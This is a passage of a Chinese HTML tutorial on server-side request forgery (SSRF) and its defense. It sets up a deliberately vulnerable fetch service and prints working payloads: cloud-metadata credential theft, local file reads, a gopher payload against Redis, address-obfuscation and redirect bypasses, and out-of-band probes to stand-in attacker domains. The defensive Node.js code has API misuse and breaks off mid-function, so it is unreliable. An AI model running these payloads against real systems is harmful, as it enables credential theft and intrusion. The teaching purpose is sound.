@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>二十分钟学透 SSRF 深入与防御</title>
+<style>
+:root{
+  --bg:#F7F7F5; --card:#FFFFFF; --ink:#1A1A18; --muted:#6B6B66; --faint:#9A9A93;
+  --line:#E4E3DE; --accent:#185FA5; --accent-soft:#E6F1FB;
+  --ok:#0F6E56; --ok-soft:#E1F5EE; --warn:#854F0B; --warn-soft:#FAEEDA;
+  --danger:#A32D2D; --danger-soft:#FCEBEB; --violet:#534AB7; --violet-soft:#EEEDFE;
+  --code:#F1EFE8; --radius:12px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{background:var(--bg);color:var(--ink);font-family:system-ui,-apple-system,"Segoe UI","Microsoft YaHei",sans-serif;font-size:15px;line-height:1.7;-webkit-font-smoothing:antialiased}
+code,pre,.mono{font-family:ui-monospace,"Cascadia Code",Consolas,"Courier New",monospace}
+#bar{position:fixed;top:0;left:0;height:3px;width:0;background:var(--accent);z-index:99;transition:width .1s linear}
+header{background:var(--card);border-bottom:1px solid var(--line);padding:44px 24px 34px}
+.wrap{max-width:900px;margin:0 auto;padding:0 24px}
+.serie{display:inline-block;font-size:12px;font-weight:600;letter-spacing:.5px;color:var(--violet);background:var(--violet-soft);padding:3px 11px;border-radius:999px;margin-bottom:14px}
+.density{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.chip{font-size:12px;color:var(--muted);background:var(--bg);border:1px solid var(--line);border-radius:999px;padding:3px 11px}
+.chip b{color:var(--accent);font-weight:600}
+h1{font-size:29px;font-weight:600;letter-spacing:-.4px;line-height:1.3}
+.sub{color:var(--muted);margin-top:10px;font-size:15px}
+.sub b{color:var(--ink);font-weight:500}
+.timerbox{display:flex;align-items:center;gap:18px;flex-wrap:wrap;margin-top:24px;padding:16px 20px;background:var(--bg);border:1px solid var(--line);border-radius:var(--radius)}
+#clock{font-size:34px;font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:1px;color:var(--accent);min-width:118px}
+#clock.done{color:var(--danger)}
+.btn{border:1px solid var(--line);background:var(--card);color:var(--ink);padding:7px 16px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;transition:.15s}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.btn.primary:hover{opacity:.88;color:#fff}
+.timerhint{font-size:13px;color:var(--faint);flex:1;min-width:180px}
+main{padding:36px 0 80px}
+section{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:28px 30px;margin-bottom:20px}
+.shead{display:flex;align-items:center;gap:12px;margin-bottom:6px;flex-wrap:wrap}
+.mins{font-size:12px;font-weight:600;padding:3px 11px;border-radius:999px;background:var(--accent-soft);color:var(--accent);letter-spacing:.3px;white-space:nowrap}
+h2{font-size:20px;font-weight:600;letter-spacing:-.2px}
+h3{font-size:15px;font-weight:600;margin:22px 0 8px}
+h3:first-of-type{margin-top:16px}
+h4{font-size:14px;font-weight:600;margin:16px 0 4px;color:var(--muted)}
+p{color:#3A3A36;margin-top:10px}
+p.lead{color:var(--muted)}
+ul,ol{margin:10px 0 0 20px;color:#3A3A36}
+li{margin:6px 0}
+li::marker{color:var(--faint)}
+strong{font-weight:600;color:var(--ink)}
+.k{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:1px 6px;font-size:13px;color:#7A3E00}
+pre{background:#2C2C2A;color:#E8E6E1;padding:14px 16px;border-radius:10px;overflow-x:auto;font-size:13px;line-height:1.65;margin-top:12px}
+pre .c{color:#8A8A82}
+pre .g{color:#9FE1CB}
+pre .y{color:#FAC775}
+pre .b{color:#85B7EB}
+pre .r{color:#F09595}
+.callout{border-left:3px solid var(--accent);background:var(--accent-soft);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:16px;font-size:14px;color:#0C447C}
+.callout.warn{border-color:var(--warn);background:var(--warn-soft);color:#412402}
+.callout.ok{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.callout.danger{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.callout b{font-weight:600}
+table{width:100%;border-collapse:collapse;margin-top:14px;font-size:14px;table-layout:fixed}
+th{text-align:left;font-weight:600;font-size:13px;color:var(--muted);padding:9px 12px;border-bottom:1px solid var(--line);background:var(--bg)}
+td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;color:#3A3A36}
+tr:last-child td{border-bottom:none}
+td.f{font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:#7A3E00;word-break:break-all}
+.cmds{display:flex;flex-direction:column;gap:8px;margin-top:14px}
+.crow{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg);border:1px solid var(--line);border-radius:9px;flex-wrap:wrap}
+.crow code{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:3px 8px;font-size:13px;color:#7A3E00;white-space:nowrap;overflow-x:auto;max-width:100%}
+.crow .desc{font-size:13.5px;color:var(--muted);flex:1;min-width:150px}
+.copy{border:1px solid var(--line);background:var(--card);border-radius:6px;padding:3px 10px;font-size:12px;cursor:pointer;color:var(--muted);font-family:inherit}
+.copy:hover{border-color:var(--accent);color:var(--accent)}
+.copy.ok{border-color:var(--ok);color:var(--ok)}
+.steps{counter-reset:s;margin-top:14px}
+.step{display:flex;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.step:last-child{border-bottom:none}
+.step::before{counter-increment:s;content:counter(s);flex:0 0 26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.step .txt{flex:1;font-size:14.5px;color:#3A3A36}
+.step .txt b{color:var(--ink)}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin-top:14px}
+.card{background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card .ct{font-size:14px;font-weight:600;margin-bottom:5px;display:flex;align-items:center;gap:7px}
+.card .cd{font-size:13.5px;color:var(--muted);line-height:1.6}
+.dot{width:8px;height:8px;border-radius:50%;flex:0 0 8px}
+.quiz{margin-top:14px}
+.q{border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin-bottom:10px}
+.q .qt{font-size:14.5px;font-weight:600;margin-bottom:8px}
+.opt{display:block;width:100%;text-align:left;padding:8px 12px;margin:5px 0;border:1px solid var(--line);background:var(--card);border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;color:#3A3A36;transition:.15s}
+.opt:hover{border-color:var(--accent)}
+.opt.right{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.opt.wrong{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.ans{font-size:13.5px;color:var(--muted);margin-top:8px;display:none}
+.ans.show{display:block}
+.pit{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line)}
+.pit:last-child{border-bottom:none}
+.pit .num{flex:0 0 28px;height:28px;border-radius:8px;background:var(--danger-soft);color:var(--danger);font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.pit .pb{flex:1}
+.pit .pt{font-size:14.5px;font-weight:600}
+.pit .pd{font-size:13.5px;color:var(--muted);margin-top:3px}
+footer{text-align:center;color:var(--faint);font-size:13px;padding:0 24px 50px}
+@media(max-width:600px){
+  h1{font-size:23px} section{padding:22px 18px} header{padding:32px 0 26px}
+  .wrap{padding:0 16px} table{font-size:13px;table-layout:auto}
+  th,td{padding:8px 8px}
+}
+</style>
+</head>
+<body>
+<div id="bar"></div>
+
+<header>
+  <div class="wrap">
+    <span class="serie">十分钟系列 · 第 23 期 · 高密度版</span>
+    <h1>二十分钟学透 SSRF 深入与防御</h1>
+    <p class="sub">SSRF 不是"发个请求"那么简单。这篇讲清楚三件事：服务端代请求为什么危险、<b>绕过手法的真实原理</b>（IP 变形 / DNS rebinding / @ 欺骗 / 重定向）、以及能落地的防御代码（白名单、解析后校验、IMDSv2、网络层隔离）。</p>
+    <div class="density">
+      <span class="chip">覆盖 <b>8</b> 大模块</span>
+      <span class="chip"><b>3</b> 种协议走私</span>
+      <span class="chip"><b>5</b> 类绕过手法</span>
+      <span class="chip"><b>10</b> 个真实坑</span>
+      <span class="chip"><b>6</b> 道自测</span>
+    </div>
+    <div class="timerbox">
+      <div id="clock">20:00</div>
+      <button class="btn primary" id="start">开始计时</button>
+      <button class="btn" id="reset">重置</button>
+      <span class="timerhint" id="hint">建议起一个 httpbin 跟着敲：docker run -d -p 8080:80 kennethreitz/httpbin</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+<section id="s0">
+  <div class="shead"><span class="mins">开始前</span><h2>先建立一个靶场</h2></div>
+  <p class="lead">SSRF 的核心是"服务端替你请求一个你指定的 URL"。要理解它，先得有一个会替你发请求的服务。</p>
+  <pre><span class="c"># 起一个回显请求信息的服务（httpbin 的 /get 会把你请求的 URL 参数回显）</span>
+docker run -d -p 8080:80 --name httpbin kennethreitz/httpbin
+
+<span class="c"># 一个最脆弱的"图片抓取"服务（Python Flask，仅本地靶场用）</span>
+<span class="c"># pip install flask requests</span>
+cat &gt; app.py &lt;&lt;'EOF'
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+@app.route("/fetch")
+def fetch():
+    url = request.args.get("url", "")
+    r = requests.get(url, timeout=5)      <span class="c"># 没有任何校验：这就是一个 SSRF 靶场</span>
+    return r.text[:500]
+
+app.run(host="127.0.0.1", port=5000)
+EOF
+python app.py
+
+<span class="c"># 打自己：服务端视角的"本地"和你的"本地"不是同一台机器</span>
+curl "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:6379/"   <span class="c"># 请求服务端自己的 Redis</span></pre>
+  <div class="callout warn">
+    <b>靶场纪律：</b>这个练习只允许打<b>你自己机器上的服务</b>。对任何不是你拥有的目标发请求，都可能违反法律或公司安全政策。后面所有 payload 都从这个靶场出发。
+  </div>
+</section>
+
+<section id="s1">
+  <div class="shead"><span class="mins">模块 1</span><h2>SSRF 原理：服务端代请求</h2></div>
+  <p class="lead">SSRF（Server-Side Request Forgery）的本质：<b>攻击者控制了服务端发起请求的目标地址</b>。服务端替攻击者"伸手"去摸它摸得到、而你摸不到的地方。</p>
+  <h3>为什么危险：服务端有三个你没有的位置优势</h3>
+  <table>
+    <tr><th style="width:150px">优势</th><th>说明</th></tr>
+    <tr><td><b>位于内网</b></td><td>应用服务器通常和数据库、缓存、中间件、其他微服务在同一个内网。外网防火墙只挡"外面进里面"，不挡"里面连里面"</td></tr>
+    <tr><td><b>拥有云身份</b></td><td>EC2/ECS 实例通常挂载了 IAM Role，实例内访问 <span class="k">169.254.169.254</span> 就能拿到临时凭证 —— 这把"打到内网 HTTP"升级成"拿到云账号权限"</td></tr>
+    <tr><td><b>被其他组件信任</b></td><td>Redis、Elasticsearch、Kubernetes API 等默认监听在内网且没有认证或认证很弱。服务端发出的请求在它们眼里是"自己人"</td></tr>
+  </table>
+  <h3>业务里哪些功能最容易出 SSRF</h3>
+  <table>
+    <tr><th style="width:170px">功能点</th><th>典型请求</th></tr>
+    <tr><td><b>远程图片/头像抓取</b></td><td class="f">GET /avatar?url=https://example.com/a.png</td></tr>
+    <tr><td><b>Webhook 回调</b></td><td class="f">POST /webhook {url, payload} → 服务端转发</td></tr>
+    <tr><td><b>RSS/链接预览</b></td><td class="f">GET /preview?link=... 服务端抓 OG 标签</td></tr>
+    <tr><td><b>PDF/截图生成</b></td><td class="f">wkhtmltopdf / headless Chrome 渲染用户给的 URL</td></tr>
+    <tr><td><b>OAuth 回调配置</b></td><td class="f">redirect_uri 校验不严 → 打到内网回调端点</td></tr>
+    <tr><td><b>文件导入/订阅</b></td><td class="f">从远程 URL 拉取 CSV、SVG、XML</td></tr>
+    <tr><td><b>微服务内部调用</b></td><td class="f">网关把用户传入的 host 拼进 upstream</td></tr>
+  </table>
+  <pre><span class="c"># 一次典型攻击链（以靶场为例）</span>
+<span class="c"># 1. 确认服务端真的会发请求（回显 SSRF）</span>
+curl "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:8080/get?x=1"
+
+<span class="c"># 2. 探测服务端本地端口（内网扫描）</span>
+for p in 22 80 443 3306 6379 8080 9200; do
+  curl -s -o /dev/null -w "%{http_code} %{time_total}s port=$p\n" \
+    "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:$p/"
+done
+<span class="c"># 端口开着通常返回 4xx/banner，关着连接被拒 —— 用响应差异判断开放状态</span></pre>
+  <div class="callout danger">
+    <b>2019 年 Capital One 事件是 SSRF 的标准教材：</b>攻击者利用 AWS WAF 后一个应用的 SSRF 漏洞，向 <span class="k">169.254.169.254</span> 发起请求，<b>从实例元数据服务拿到了 EC2 角色的临时凭证</b>，再用这套凭证列出 S3 并下载了约 1 亿用户的数据。一次"发请求"的漏洞，最终变成了云账号数据泄露。SSRF 在云环境从来不是低危。
+  </div>
+</section>
+
+<section id="s2">
+  <div class="shead"><span class="mins">模块 2</span><h2>利用场景：元数据、内网、协议走私</h2></div>
+  <h3>场景一：云元数据服务（最值钱的靶子）</h3>
+  <table>
+    <tr><th style="width:120px">厂商</th><th style="width:220px">元数据地址</th><th>关键路径</th></tr>
+    <tr><td><b>AWS</b></td><td class="f">169.254.169.254</td><td class="f">/latest/meta-data/iam/security-credentials/&lt;role&gt;</td></tr>
+    <tr><td><b>阿里云</b></td><td class="f">100.100.100.100</td><td class="f">/latest/meta-data/ram/security-credentials/&lt;role&gt;</td></tr>
+    <tr><td><b>Azure</b></td><td class="f">169.254.169.254</td><td>需请求头 <span class="k">Metadata: true</span></td></tr>
+    <tr><td><b>GCP</b></td><td class="f">metadata.google.internal</td><td>需请求头 <span class="k">Metadata-Flavor: Google</span></td></tr>
+    <tr><td><b>OpenStack</b></td><td class="f">169.254.169.254</td><td class="f">/openstack/latest/meta_data.json</td></tr>
+    <tr><td><b>K8s 环境变量</b></td><td class="f">KUBERNETES_SERVICE_HOST</td><td class="f">/api/v1/namespaces/default/secrets</td></tr>
+  </table>
+  <pre><span class="c"># AWS IMDSv1 的完整利用姿势（现在大部分应已升级 v2）</span>
+curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
+<span class="c"># → iam/ security-groups/ ...</span>
+curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+<span class="c"># → 角色名，比如 my-app-role</span>
+curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"
+<span class="c"># → AccessKeyId / SecretAccessKey / Token 三件套，拿去直接调云 API</span>
+
+<span class="c"># 阿里云同理，端点换 100.100.100.100</span>
+curl "http://target/fetch?url=http://100.100.100.100/latest/meta-data/ram/security-credentials/"</pre>
+  <div class="callout warn">
+    <b>169.254.169.254 是链路本地地址（169.254.0.0/16）</b>，只在链路内有效，所以"禁止外网访问"这句对它是废话 —— 它对同 VPC 内所有机器天然可达。<b>能拦住它的只有：IMDSv2 的 token 机制，或者网络层（iptables/安全组）把容器访问元数据的流量定向到黑洞。</b>
+  </div>
+  <h3>场景二：内网服务探测与打击</h3>
+  <p>不同协议"中招"后的后果完全不同，这也是 SSRF 为什么常被排成中高危：</p>
+  <table>
+    <tr><th style="width:110px">目标</th><th style="width:150px">默认端口</th><th>SSRF 打到的后果</th></tr>
+    <tr><td><b>Redis</b></td><td class="f">6379</td><td>无认证时写 SSH key、写 crontab 反弹 shell、<span class="k">CONFIG SET dir</span> 落 webshell</td></tr>
+    <tr><td><b>Elasticsearch</b></td><td class="f">9200</td><td>无认证时遍历索引、读任意文档、删数据</td></tr>
+    <tr><td><b>K8s API</b></td><td class="f">443/6443</td><td>读 Secret、创建特权 Pod（配合 ServiceAccount token）</td></tr>
+    <tr><td><b>Docker API</b></td><td class="f">2375</td><td>无 TLS 时直接创建挂载宿主根目录的容器 = 宿主机沦陷</td></tr>
+    <tr><td><b>Web 控制台</b></td><td class="f">8080/9000 等</td><td>未授权调用管理接口：重启、改配置、删数据</td></tr>
+  </table>
+  <h3>场景三：协议走私（SSRF 的"进阶伤害"）</h3>
+  <p>如果服务端请求库支持任意协议（或至少支持 gopher/file/dict），SSRF 就从"读个网页"升级为<b>与任意 TCP 服务对话</b>。</p>
+  <pre><span class="c"># file 协议：读服务端本地文件</span>
+curl "http://target/fetch?url=file:///etc/passwd"
+curl "http://target/fetch?url=file:///proc/self/environ"   <span class="c"># 环境变量里常有密钥</span>
+
+<span class="c"># dict 协议：探测服务 banner，判断端口上跑的是什么</span>
+curl "http://target/fetch?url=dict://127.0.0.1:6379/info"
+<span class="c"># 返回 Redis 版本号；换 3306 能看到 MySQL 的握手包（含版本）</span>
+
+<span class="c"># gopher 协议：构造任意 TCP 字节流（最危险的一个）</span>
+<span class="c"># 例：给无认证 Redis 发一条命令，把结果写进一个 key</span>
+curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SET%20pwned%20yes%0d%0aQUIT%0d%0a"
+<span class="c"># gopher 的 _ 后面是 TCP  payload，%0d%0a 是 CRLF —— 相当于手工发 Redis 协议</span>
+<span class="c"># 进阶：SLAVEOF 主从复制加载 .so、CONFIG SET dir 写 crontab、FastCGI 打 php-fpm</span></pre>
+  <div class="callout danger">
+    <b>gopher 是协议走私的核心：</b>HTTP 协议本身受"请求-响应"模型约束，而 gopher 让攻击者把<b>原始字节流</b>塞进任意 TCP 端口。所以对 SSRF 而言，<b>限制协议白名单（只允许 http/https）和限制目标白名单一样重要</b>。反过来，防御时如果不禁用 gopher，只封内网 IP 也会被打穿。
+  </div>
+</section>
+
+<section id="s3">
+  <div class="shead"><span class="mins">模块 3</span><h2>绕过手法：五类，每类都有真实原理</h2></div>
+  <h3>1. IP 变形：绕过基于字符串的 IP 黑名单</h3>
+  <table>
+    <tr><th style="width:200px">写法</th><th>等价于</th><th style="width:150px">被谁绕过</th></tr>
+    <tr><td class="f">http://2130706433/</td><td>127.0.0.1 的十进制整数形式</td><td>任何"匹配点分四段"的正则</td></tr>
+    <tr><td class="f">http://0177.0.0.1/</td><td>八进制 IP 段（Linux inet_aton 接受）</td><td>不解析八进制的校验器</td></tr>
+    <tr><td class="f">http://0x7f.0.0.1/</td><td>十六进制 IP 段</td><td>同上</td></tr>
+    <tr><td class="f">http://127.1/</td><td>省略补零的简写</td><td>严格四段格式校验</td></tr>
+    <tr><td class="f">http://0.0.0.0/</td><td>Linux 上 0.0.0.0 路由到本机</td><td>只封 127.0.0.0/8 的规则</td></tr>
+    <tr><td class="f">http://[::1]/</td><td>IPv6 环回</td><td>只处理 IPv4 的逻辑</td></tr>
+    <tr><td class="f">http://[::ffff:127.0.0.1]/</td><td>IPv4-mapped IPv6</td><td>只识别 ::1 的规则</td></tr>
+    <tr><td class="f">http://１２７。０。０。１/</td><td>Unicode 全角数字 + 全角句点</td><td>不过 Unicode 归一化的校验</td></tr>
+  </table>
+  <pre><span class="c"># 自证：下面这些写法在 Linux 上解析结果完全一样</span>
+python3 -c "import socket; print(socket.inet_aton('127.1').hex())"        <span class="c"># 7f000001</span>
+python3 -c "import socket; print(socket.inet_aton('0x7f.0.0.1').hex())"   <span class="c"># 7f000001</span>
+python3 -c "import socket; print(socket.gethostbyname('2130706433'))"     <span class="c"># 127.0.0.1</span></pre>
+  <h3>2. DNS rebinding：绕过"解析一次校验"</h3>
+  <p>原理：攻击者域名配一个 <b>TTL=0</b> 的 A 记录，第一次解析返回公网 IP（通过白名单校验），第二次解析返回 <span class="k">127.0.0.1</span>。校验和连接用了两次不同的解析结果。</p>
+  <pre><span class="c"># rebind.it 一类服务的公开演示：域名 pinfoo.rebind.it 交替返回</span>
+<span class="c"># 7f000001.c0a80001...（内网地址编码在域名里）</span>
+<span class="c"># 时序：</span>
+<span class="c">#   1. 应用 dns.resolve("evil.com")   → 1.2.3.4   ✓ 过白名单</span>
+<span class="c">#   2. http.get("evil.com") 内部再解析 → 127.0.0.1 ✗ 打到内网</span>
+<span class="c"># 两次解析之间攻击者把 DNS 记录换掉了（TTL 0 让每个查询都可能不同）</span></pre>
+  <h3>3. @ 欺骗与 URL 解析差异</h3>
+  <pre><span class="c"># URL 规范：@ 前面是 userinfo，后面才是 host</span>
+http://api.trusted.com@127.0.0.1/     <span class="c"># 真实 host 是 127.0.0.1</span>
+http://127.0.0.1@api.trusted.com/     <span class="c"># 反过来，真实 host 是 trusted.com</span>
+
+<span class="c"># 各库对畸形 URL 的解析不一致，防御代码与请求库解析结果不同就可被打穿：</span>
+<span class="c"># http://trusted.com:80@127.0.0.1:6379/</span>
+<span class="c"># http://127.0.0.1:80#@api.trusted.com/</span>
+<span class="c"># http://api.trusted.com\t127.0.0.1/   （\t 是 tab，某些解析器截断）</span></pre>
+  <h3>4. 重定向跟随：302 跳到内网</h3>
+  <pre><span class="c"># 攻击者完全可控的公网服务器，返回：</span>
+HTTP/1.1 302 Found
+Location: http://169.254.169.254/latest/meta-data/
+
+<span class="c"># 应用发起时 URL 是 https://evil.com/redir（过了白名单）</span>
+<span class="c"># requests/浏览器默认自动跟随，第二跳已经在内网 —— 每跳都校验才能防住</span></pre>
+  <h3>5. 短链与开放式代理</h3>
+  <ul>
+    <li><b>短链接</b>（t.cn、bit.ly）：白名单看到的是短链域名，展开后是内网地址。防御要对<b>最终 URL</b> 校验，或干脆禁短链</li>
+    <li><b>DNS 记录轮换 / CNAME 链</b>：白名单校验的是 A 记录，连接时走 CNAME 到内网</li>
+    <li><b>HTTPS 证书/SNI 与真实连接不一致</b>：对 TLS 终结代理场景，校验 SNI 不等于校验目标</li>
+  </ul>
+  <div class="callout">
+    <b>记住绕过的总规律：</b>所有绕过都在利用<b>"校验时看到的信息"和"连接时实际使用的信息"不一致</b> —— 字符串 vs 解析结果、域名 vs IP、第一跳 vs 后续跳。防御的设计目标就是消灭这个 gap：<b>解析后校验、pin 住 IP、每一跳重新校验</b>。
+  </div>
+</section>
+
+<section id="s4">
+  <div class="shead"><span class="mins">模块 4</span><h2>盲 SSRF 与检测</h2></div>
+  <p class="lead">盲 SSRF（Blind SSRF）：服务端发起了请求，但<b>不把响应内容返回给攻击者</b>。看不到内容 ≠ 没有危害 —— 元数据照样能被打到，危害只是从"读数据"降级为"触发动作"。</p>
+  <h3>三种检测信道</h3>
+  <table>
+    <tr><th style="width:130px">信道</th><th>原理</th><th>工具</th></tr>
+    <tr><td><b>外带 DNS</b></td><td>目标 URL 里放唯一子域名 <span class="k">abc123.oob.attacker.com</span>，服务端解析它就会在 DNS 日志留下记录</td><td class="f">Burp Collaborator、dnslog.cn、自建 NS</td></tr>
+    <tr><td><b>时间侧信道</b></td><td>端口开放 vs 关闭的响应时间差异可达毫秒~秒级（SYN→RST 立即拒绝 vs 超时）</td><td class="f">curl -w "%{time_total}"</td></tr>
+    <tr><td><b>间接回显</b></td><td>错误页、日志、监控告警、邮件回调中间接暴露请求结果</td><td class="f">看 500 页面 / 应用日志</td></tr>
+  </table>
+  <pre><span class="c"># 时间侧信道实测（靶场：5000 端口开着，5001 关着）</span>
+curl -s -o /dev/null -w "open_port: %{time_total}s\n" "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/"
+curl -s -o /dev/null -w "closed_port: %{time_total}s\n" "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5001/"
+<span class="c"># 关着的端口：连接被拒或等待超时，时间明显更长 —— 用时间差画出内网端口图</span>
+
+<span class="c"># 外带验证（盲 SSRF 的金标准）</span>
+curl "http://target/fetch?url=http://a1b2c3d4.oob.example.com/probe"
+<span class="c"># 然后看 DNS 日志是否出现 a1b2c3d4.oob.example.com 的 A 记录查询</span>
+<span class="c"># 出现了 = 服务端真的解析了你的域名 = SSRF 实锤，且能看到服务端出口 IP</span></pre>
+  <div class="callout warn">
+    <b>从防御视角，"检测"和"发现"同样重要：</b>生产环境应对<b>出站请求</b>建立可见性 —— ① 所有对外请求走统一的 egress 代理，禁止业务容器直连；② 监控对 <span class="k">169.254.169.254</span>、<span class="k">100.100.100.100</span>、非业务内网段的连接尝试；③ 在 DNS 层记录异常查询。没有这些日志，出了事你连"请求从哪发出的"都查不到。
+  </div>
+</section>
+
+<section id="s5">
+  <div class="shead"><span class="mins">模块 5</span><h2>防御：五层，从代码到网络</h2></div>
+  <h3>第一层：输入侧白名单</h3>
+  <ul>
+    <li><b>域名白名单</b>，不是黑名单。黑名单永远追不上变形和 0day 域名</li>
+    <li><b>白名单要精确匹配</b>：<span class="k">host === "api.trusted.com"</span>，不是 <span class="k">endsWith</span>（否则 <span class="k">api.trusted.com.evil.com</span> 通过）</li>
+    <li><b>协议白名单</b>：只允许 <span class="k">http:</span> / <span class="k">https:</span>，显式禁用 gopher / file / dict / ftp</li>
+    <li><b>禁止用户指定端口</b>，或只允许 80/443</li>
+  </ul>
+  <h3>第二层：解析后校验（防 IP 变形与 rebinding）</h3>
+  <p>顺序不能反：<b>先 DNS 解析拿到全部 IP，逐个校验是公网单播地址，然后用这个 IP 建立连接</b>。</p>
+  <h3>第三层：连接侧加固</h3>
+  <ul>
+    <li><b>pin IP</b>：把校验过的 IP 直接传给 HTTP 客户端（socket 层指定 address），Header 里带原 Host。让"再解析一次"没有机会发生</li>
+    <li><b>重定向</b>：<span class="k">allow_redirects=False</span>，或每一跳都重新走一遍完整校验</li>
+    <li><b>超时 + 响应大小上限</b>：3~5 秒超时、响应体截断到 1MB，防止被慢端口拖死线程池</li>
+  </ul>
+  <h3>第四层：云元数据加固</h3>
+  <pre><span class="c"># AWS：强制 IMDSv2（实例级 / 通过 launch template）</span>
+aws ec2 modify-instance-metadata-options \
+  --instance-id i-xxxx \
+  --http-tokens required \
+  --http-put-response-hop-limit 1
+
+<span class="c"># v2 与 v1 的关键差别：GET 直接读 → 必须先 PUT 拿 token</span>
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/
+<span class="c"># SSRF 漏洞只能发出 GET 类请求，没法先 PUT —— v2 让纯 GET 型 SSRF 报废</span>
+
+<span class="c"># 阿里云：实例元数据加固模式（同样强制 token）</span>
+<span class="c"># 控制台开启"实例元数据加固模式"，或 API Set InstanceMetadataOptions</span>
+
+<span class="c"># 容器场景：禁止 Pod 访问元数据（网络层定向黑洞）</span>
+iptables -A OUTPUT -d 169.254.169.254 -j DROP
+<span class="c"># K8s 可用 NetworkPolicy 默认拒绝 + 显式放行（metadata 走 node 网络，需配合 CNI）</span></pre>
+  <h3>第五层：网络层隔离</h3>
+  <ul>
+    <li><b>出站代理</b>：业务容器不直接出网，所有请求走统一 egress 代理，代理上配白名单和日志</li>
+    <li><b>安全组/防火墙</b>：应用层只允许访问明确的出站目标（对象存储 CDN、合作方 API），默认拒绝</li>
+    <li><b>元数据服务最小授权</b>：给实例挂的 IAM Role 只授必要权限，SSRF 拿到 token 也干不了大事</li>
+    <li><b>不响应不可信内容</b>：不要把抓取到的远程内容直接内联进自己页面（防存储型 XSS 和二阶 SSRF）</li>
+  </ul>
+  <div class="callout ok">
+    <b>防御组合的性价比排序：</b>① 开启 IMDSv2 / 元数据加固（半小时，防住最贵的事故）；② 出站统一代理 + 白名单（一天，防住大部分利用）；③ 代码层解析后校验 + pin IP（需要改造，防住 rebinding 这类高级绕过）。三件事都做，SSRF 的剩余风险才可接受。
+  </div>
+</section>
+
+<section id="s6">
+  <div class="shead"><span class="mins">模块 6</span><h2>修复代码：从漏洞版到安全版</h2></div>
+  <h3>漏洞版（Node.js）</h3>
+  <pre><span class="c">// ✗ 用户传什么就打什么</span>
+app.get("/fetch", async (req, res) =&gt; {
+  const r = await axios.get(req.query.url, { timeout: 5000 });
+  res.send(r.data);
+});
+<span class="c">// 问题：无协议限制、无目标校验、自动跟随重定向、无响应大小上限</span></pre>
+  <h3>安全版（Node.js：白名单 + 解析后校验 + pin IP + 禁重定向）</h3>
+  <pre><span class="c">const dns = require("dns").promises;</span>
+const net = require("net");
+const http = require("http");
+const https = require("https");
+
+const ALLOWED = new Set(["api.trusted.com", "cdn.trusted.com"]);
+
+function assertPublic(ip) {
+  if (net.isIPv4(ip)) {
+    if (ip.startsWith("127.") || ip === "0.0.0.0" ||
+        ip.startsWith("10.") || ip.startsWith("169.254.") ||
+        ip.startsWith("192.168.") || ip.startsWith("100.") ||
+        /^172\.(1[6-9]|2\d|3[01])\./.test(ip)) {
+      throw new Error("blocked private ip: " + ip);
+    }
+  } else {
+    if (ip === "::1" || ip.startsWith("fe80:") || ip.startsWith("fc") ||
+        ip.startsWith("fd") || ip.startsWith("::ffff:")) {
+      throw new Error("blocked ipv6: " + ip);
+    }
+  }
+}
+
+async function safeFetch(inputUrl) {
+  const u = new URL(inputUrl);
+  <span class="c">// 1) 协议白名单</span>
+  if (u.protocol !== "http:" &amp;&amp; u.protocol !== "https:") throw new Error("scheme");
+  <span class="c">// 2) 主机精确白名单 + 端口</span>
+  if (!ALLOWED.has(u.hostname)) throw new Error("host");
+  if (u.port &amp;&amp; u.port !== "80" &amp;&amp; u.port !== "443") throw new Error("port");
+  <span class="c">// 3) 解析后校验：所有 A/AAAA 记录都必须是公网地址</span>
+  const ips = (await dns.resolve(u.hostname, { all: true })).map(x =&gt; x.address);
+  ips.forEach(assertPublic);
+  <span class="c">// 4) pin IP：用第一个 IP 建连，Host 头带原域名，杜绝二次解析</span>
+  const mod = u.protocol === "https:" ? https : http;
+  const req = mod.request({
+    host: ips[0],
+    port: u.port || (u.protocol === "https:" ? 443 : 80),
+    path: u.pathname + u.search,
+    headers: { Host: u.hostname },
